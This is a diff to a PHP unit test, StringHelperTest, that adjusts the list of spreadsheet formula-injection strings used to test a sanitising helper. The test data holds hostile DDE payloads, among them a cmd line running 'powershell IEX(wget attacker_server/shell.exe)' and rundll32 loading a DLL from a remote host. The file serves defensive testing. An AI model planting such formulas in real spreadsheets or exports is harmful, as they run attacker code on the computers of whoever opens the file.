@@ -35,19 +35,15 @@ class StringHelperTest extends TestCase
         yield ["@SUM(1+9)*cmd|' /C calc'!A0"];
         yield ["-10+20+cmd|' /C calc'!A0"];
         yield ["+10+20+cmd|' /C calc'!A0"];
-        yield [";10+20+cmd|' /C calc'!A0"];
-        yield ["!10+20+cmd|' /C calc'!A0"];
         yield ["=10+20+cmd|' /C calc'!A0"];
-        yield ["|10+20+cmd|' /C calc'!A0"];
         yield ["=cmd|' /C notepad'!'A1'"];
         yield ["=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0"];
         yield ["=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1"];
         yield ["	=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1"];
-        yield ["\"10+20+cmd|' /C calc'!A0"];
-        yield ["\t10+20+cmd|' /C calc'!A0"];
-        yield ["\r10+20+cmd|' /C calc'!A0"];
-        yield ["\n10+20+cmd|' /C calc'!A0"];
-        yield ["\r\n10+20+cmd|' /C calc'!A0"];
+        yield ["\t=10+20+cmd|' /C calc'!A0"];
+        yield ["\r=10+20+cmd|' /C calc'!A0"];
+        yield ["\n=10+20+cmd|' /C calc'!A0"];
+        yield ["\r\n=10+20+cmd|' /C calc'!A0"];
         yield [PHP_EOL . "=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1"];
     }
 
